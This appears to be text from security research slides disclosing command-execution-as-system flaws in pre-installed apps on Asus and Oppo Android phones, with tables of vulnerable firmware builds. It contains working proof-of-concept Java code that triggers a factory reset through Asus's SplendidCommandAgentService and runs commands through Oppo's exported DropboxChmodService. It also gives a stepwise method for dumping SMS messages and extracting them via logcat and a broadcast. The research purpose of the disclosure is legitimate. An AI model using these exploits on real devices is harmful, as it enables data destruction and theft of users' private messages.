private void asus_zenfone_V_live_command_execution_as_system_user() {
Intent i = new Intent();
i.setClassName("com.asus.splendidcommandagent", "com.asus.splendidcommandagent.SplendidCommandAgentService");
SplendidServiceConnection servConn = new SplendidServiceConnection();
boolean ret = bindService(i, servConn, BIND_AUTO_CREATE);
Log.i(TAG, "initService() bound with " + ret);
}
class SplendidServiceConnection implements ServiceConnection {
public void onServiceConnected(ComponentName name, IBinder boundService) {
Log.i(TAG, "onserviceConnected");
Parcel send = Parcel.obtain();
Parcel reply = Parcel.obtain();
send.writeInterfaceToken("com.asus.splendidcommandagent.ISplendidCommandAgentService");
send.writeString("am broadcast -a android.intent.action.MASTER_CLEAR");
try {
boolean success = boundService.transact(1, send, reply, Binder.FLAG_ONEWAY);
Log.i(TAG, "binder transaction success=" + success);
} catch (RemoteException e) {
e.printStackTrace();
}
send.recycle();
reply.recycle();
}
public void onServiceDisconnected(ComponentName arg0) {
Log.i(TAG, "onServiceConnected");
}
}
20
Asus ZenFone V Live – Command Execution as system User
Source: https://www.verizonwireless.com/smartphones/asus-zenfone-v-live/
system User Capabilities on Android 7.1.1
• Video Record Screen of the user
• Take screenshots
• Factory reset the device
• Use logcat to obtain system-wide logs
• Set a custom keyboard with keylogging 
functionality
• Change settings configurations
• Register an app as a notification listener 
to get the user’s notifications
• Enable/disable apps
• Invert the screen colors
• Call (emergency) phone numbers
• Set a custom spell checker
• Change certain system properties
• Inject clicks, swipes, and text events in 
the GUI (emulate the user)
• Launch any app component that does 
not have android:enabled attribute 
set to false
• Read/modify user’s text messages
• Read/modify user’s call log
• Read/modify user’s contacts
21
Sample of Asus Android Devices – Command 
Execution as system User
Device
Status
Build Fingerprint
Asus ZenFone V Live (Verizon) Vulnerable
asus/VZW_ASUS_A009/ASUS_A009:7.1.1/NMF26F/14.0610.1802.78-
20180313:user/release-keys
Asus ZenFone 3 Max
Vulnerable
asus/US_Phone/ASUS_X008_1:7.0/NRD90M/US_Phone-14.14.1711.92-
20171208:user/release-keys
Asus ZenFone 3 Ultra
Vulnerable
asus/JP_Phone/ASUS_A001:7.0/NRD90M/14.1010.1711.64-
20171228:user/release-keys
Asus ZenFone 4 Max
Vulnerable
asus/WW_Phone/ASUS_X00ID:7.1.1/NMF26F/14.2016.1803.232-
20180301:user/release-keys
Asus ZenFone 4 Max Pro
Vulnerable
asus/WW_Phone/ASUS_X00ID:7.1.1/NMF26F/14.2016.1803.232-
20180301:user/release-keys
Asus ZenFone 4 Selfie
Vulnerable
asus/WW_Phone/ASUS_X00LD_3:7.1.1/NMF26F/14.0400.1802.190-
20180202:user/release-keys
Asus ZenFone Live
Vulnerable
asus/WW_Phone/zb501kl:6.0.1/MMB29P/13.1407.1801.57-
20180307:user/release-keys
Asus ZenPad 10
Vulnerable
asus/JP_P00C/P00C_2:7.0/NRD90M/JP_P00C-V5.3.20-
20171229:user/release-keys
Asus ZenPad 3 8.0
Vulnerable
asus/WW_P008/P008_1:7.0/NRD90M/WW_P008-V5.7.3-
20180110:user/release-keys
Asus ZenPad S 8.0
Not Vulnerable
asus/WW_P01M/P01M:6.0.1/MMB29P/WW_P01M-V5.6.0-
20170608:user/release-keys
22
Asus ZenFone 3 (ZE552KL) – Timeline for the 
Command Execution as system User Vulnerability 
23
Target Market
Release Date
Status
Build Fingerprint
Japan
05/21/18
Vulnerable
asus/JP_Phone/ASUS_Z012D:8.0.0/OPR1.170623.0
26/15.0410.1804.60-0:user/release-keys
Worldwide
05/16/18
Vulnerable
asus/WW_Phone/ASUS_Z012D:8.0.0/OPR1.170623.0
26/15.0410.1804.60-0:user/release-keys
Worldwide
05/03/18
Vulnerable
asus/WW_Phone/ASUS_Z012D:8.0.0/OPR1.170623.0
26/15.0410.1803.55-0:user/release-keys
Worldwide
04/19/18
Vulnerable
asus/WW_Phone/ASUS_Z012D:8.0.0/OPR1.170623.0
26/15.0410.1803.53-0:user/release-keys
Japan
04/19/18
Vulnerable
asus/JP_Phone/ASUS_Z012D:8.0.0/OPR1.170623.0
26/15.0410.1803.52-0:user/release-keys
China
03/23/18
Not Vulnerable
asus/CN_Phone/ASUS_Z012D:6.0.1/MMB29P/13.201
0.1801.197-20180302:user/release-keys
Worldwide
03/14/18
Vulnerable
asus/WW_Phone/ASUS_Z012D:8.0.0/OPR1.170623.0
26/15.0410.1802.44-0:user/release-keys
Worldwide
02/12/18
Vulnerable
asus/WW_Phone/ASUS_Z012D:8.0.0/OPR1.170623.0
26/15.0410.1801.40-0:user/release-keys
China
02/12/18
Not Vulnerable
asus/CN_Phone/ASUS_Z012D:6.0.1/MMB29P/13.201
0.1801.196-20180108:user/release-keys
Worldwide
01/29/18
Vulnerable
asus/WW_Phone/ASUS_Z012D:8.0.0/OPR1.170623.0
26/15.0410.1801.40-0:user/release-keys
Japan
01/11/18
Vulnerable
asus/JP_Phone/ASUS_Z012D:7.0/NRD90M/14.2020.
1712.85-20171228:user/release-keys
Worldwide
01/08/18
Vulnerable
asus/WW_Phone/ASUS_Z012D:7.0/NRD90M/14.2020.
1712.85-20171228:user/release-keys
Worldwide
12/22/17
Vulnerable
asus/WW_Phone/ASUS_Z012D:7.0/NRD90M/14.2020.
1711.83-20171220:user/release-keys
Worldwide
12/15/17
Vulnerable
asus/WW_Phone/ASUS_Z012D:7.0/NRD90M/14.2020.
1711.79-20171206:user/release-keys
Japan
11/22/17
Vulnerable
asus/JP_Phone/ASUS_Z012D:7.0/NRD90M/14.2020.
1711.75-20171115:user/release-keys
Worldwide
11/21/17
Vulnerable
asus/WW_Phone/ASUS_Z012D:7.0/NRD90M/14.2020.
1711.75-20171115:user/release-keys
Target Market
Release Date
Status
Build Fingerprint
Worldwide
10/13/17
Vulnerable
asus/WW_Phone/ASUS_Z012D:7.0/NRD90M/14.2020
.1709.68-20171003:user/release-keys
China
09/06/17
Not Vulnerable
asus/CN_Phone/ASUS_Z012D:6.0.1/MMB29P/13.20
10.1706.184-20170817:user/release-keys
Japan
08/08/17
Vulnerable
asus/JP_Phone/ASUS_Z012D:7.0/NRD90M/14.2020
.1708.56-20170719:user/release-keys
Worldwide
08/03/17
Vulnerable
asus/WW_Phone/ASUS_Z012D:7.0/NRD90M/14.2020
.1708.56-20170719:user/release-keys
China
07/24/17
Not Vulnerable
asus/CN_Phone/ASUS_Z012D:6.0.1/MMB29P/13.20
10.1706.181-20170710:user/release-keys
Worldwide
07/14/17
Vulnerable
asus/WW_Phone/ASUS_Z012D:7.0/NRD90M/14.2020
.1706.53-20170628:user/release-keys
Italy
06/29/17
Vulnerable
asus/TIM_Phone/ASUS_Z012D:7.0/NRD90M/14.202
0.1704.41-20170526:user/release-keys
Japan
05/17/17
Vulnerable
asus/JP_Phone/ASUS_Z012D:7.0/NRD90M/14.2020
.1703.33-20170424:user/release-keys
Worldwide
04/21/17
Vulnerable
asus/WW_Phone/ASUS_Z012D:7.0/NRD90M/14.2020
.1703.28-20170410:user/release-keys
China
03/31/17
Not Vulnerable
asus/CN_Phone/ASUS_Z012D:6.0.1/MMB29P/13.20
10.1701.170-20170323:user/release-keys
Italy
03/28/17
Vulnerable
asus/TIM_Phone/ASUS_Z012D:7.0/NRD90M/14.201
5.1701.13-20170310:user/release-keys
Worldwide
03/08/17
Vulnerable
asus/WW_Phone/ASUS_Z012D:7.0/NRD90M/14.2015
.1701.8-20170222:user/release-keys
Japan
02/24/17
Not Vulnerable
asus/JP_Phone/ASUS_Z012D:6.0.1/MMB29P/13.20
10.1612.161-20170205:user/release-keys
China
01/09/17
Not Vulnerable
asus/CN_Phone/ASUS_Z012D:6.0.1/MMB29P/13.20
.10.150-20161214:user/release-keys
Worldwide
12/28/2016
Not Vulnerable
asus/WW_Phone/ASUS_Z012D:6.0.1/MMB29P/13.20
.10.152-20161222:user/release-keys
Worldwide
12/08/2016
Not vulnerable
asus/WW_Phone/ASUS_Z012D:6.0.1/MMB29P/13.20
.10.140-20161117:user/release-keys
@Override
public int onStartCommand(final Intent intent, int flags, int startId) {
new Thread() {
public void run() {
if (intent == null) {
stopSelf();
return;
}
String action = intent.getStringExtra("action");
if (action.isEmpty()) {
action = intent.getAction();
}
Log.i("DropboxChmodService", "action = [" + action + "]");
if (action.isEmpty()) {
stopSelf();
return;
}
try {
Process process = Runtime.getRuntime().exec(action);
Log.i("DropboxChmodService", "wait begin");
process.waitFor();
Log.i("DropboxChmodService", "wait end");
} catch (Exception e) {
e.printStackTrace();
}
}
}.start();
return super.onStartCommand(intent, flags, startId);
}
Oppo F5 (Non-US Carriers) – Command Execution as system User
com.dropboxchmod app exposes 
this capability through an exported 
service named DropboxChmodService
– Simple app containing only one class 
with a single nested anonymous class
Recreated source code based on
the disassembled odex file
24
Intent i = new Intent();
i.setClassName("com.dropboxchmod", 
"com.dropboxchmod.DropboxChmodService");
i.setAction("/system/bin/screenrecord --time-limit 60 
/sdcard/notascreenrecording.mp4");
startService(i);
Source: https://www.flipkart.com/oppo-
f5-red-64-gb/p/itmezq6rgu7uhcf4
Approach 1: Transfer Command Output Using a Broadcast Receiver
1. Choose log tag (e.g., UQ2h9hVRhLfg) and register a broadcast receiver with it as an action string
2. Write lines of the script with selected log tag to the logcat log from the attacking app
Log.d("UQ2h9hVRhLfg", "#!/bin/sh");
Log.d("UQ2h9hVRhLfg", "content query --uri content://sms > 
/data/data/com.dropboxchmod/msg.txt");
Log.d("UQ2h9hVRhLfg", "am broadcast -a UQ2h9hVRhLfg -p  
--es data \"$(cat /data/data/com.dropboxchmod/msg.txt)\"");
3. Make the vulnerable app execute commands so it writes the lines to a shell script and executes it
logcat -v raw -b main -s UQ2h9hVRhLfg:* *:S -f /data/data/com.dropboxchmod/UQ2h9hVRhLfg.sh -d 
chmod 770 /data/data/com.dropboxchmod/UQ2h9hVRhLfg.sh